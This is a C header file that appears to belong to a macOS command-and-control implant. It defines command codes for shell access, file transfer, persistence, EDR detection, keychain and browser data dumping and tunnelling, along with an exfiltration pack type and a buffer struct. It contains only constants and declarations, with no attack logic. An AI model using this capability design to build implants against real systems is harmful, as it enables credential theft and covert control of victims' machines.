#ifndef TYPES_H
#define TYPES_H

#include <stdint.h>
#include <stddef.h>

/// Command codes — must match Go pl_utils.go exactly
#define COMMAND_ERROR           0
#define COMMAND_PWD             1
#define COMMAND_CD              2
#define COMMAND_SHELL           3
#define COMMAND_EXIT            4
#define COMMAND_DOWNLOAD        5
#define COMMAND_UPLOAD          6
#define COMMAND_CAT             7
#define COMMAND_CP              8
#define COMMAND_MV              9
#define COMMAND_MKDIR           10
#define COMMAND_RM              11
#define COMMAND_LS              12
#define COMMAND_PS              13
#define COMMAND_KILL            14
#define COMMAND_ZIP             15
#define COMMAND_SCREENSHOT      16
#define COMMAND_RUN             17
#define COMMAND_JOB_LIST        18
#define COMMAND_JOB_KILL        19

// macOS-specific (21-30)
#define COMMAND_CLIPBOARD       21
#define COMMAND_PERSIST         22
#define COMMAND_TCC_CHECK       23
#define COMMAND_DEFAULTS        24
#define COMMAND_EDR_CHECK       25
#define COMMAND_KEYCHAIN        26
#define COMMAND_BROWSER_DUMP    27

#define COMMAND_TUNNEL_START    31
#define COMMAND_TUNNEL_STOP     32
#define COMMAND_TUNNEL_PAUSE    33
#define COMMAND_TUNNEL_RESUME   34

#define COMMAND_TERMINAL_START  35
#define COMMAND_TERMINAL_STOP   36

/// Pack types
#define INIT_PACK       1
#define EXFIL_PACK      2
#define JOB_PACK        3
#define JOB_TUNNEL      4
#define JOB_TERMINAL    5

/// Growable buffer
typedef struct {
    uint8_t* data;
    size_t   len;
    size_t   cap;
} buffer_t;

int  buf_init(buffer_t* b, size_t initial_cap);
int  buf_append(buffer_t* b, const void* data, size_t len);
void buf_free(buffer_t* b);
void buf_reset(buffer_t* b);

/// Boolean for clarity
#ifndef bool
#define bool  _Bool
#define true  1
#define false 0
#endif

#endif // TYPES_H
